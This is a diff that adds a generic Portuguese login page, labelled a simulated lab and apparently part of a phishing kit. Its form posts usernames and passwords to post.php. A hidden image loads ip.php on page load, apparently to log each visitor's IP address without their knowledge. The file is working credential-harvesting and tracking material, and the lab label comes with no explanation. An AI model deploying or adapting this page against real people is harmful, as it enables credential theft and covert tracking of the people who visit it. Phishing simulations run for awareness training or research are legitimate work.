@@ -1,1 +1,25 @@
-
+<!-- .sites/generic/index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Simulado - Laboratório</title>
+    <style>
+        body { font-family: Arial; background: #e9ecef; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .form { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { background: #007bff; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; }
+        h2 { text-align: center; color: #333; }
+    </style>
+</head>
+<body>
+    <div class="form">
+        <h2>Acesso ao Sistema</h2>
+        <form method="POST" action="post.php">
+            <input type="text" name="username" placeholder="Usuário" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+    <img src="ip.php" style="display:none;">
+</body>
+</html>
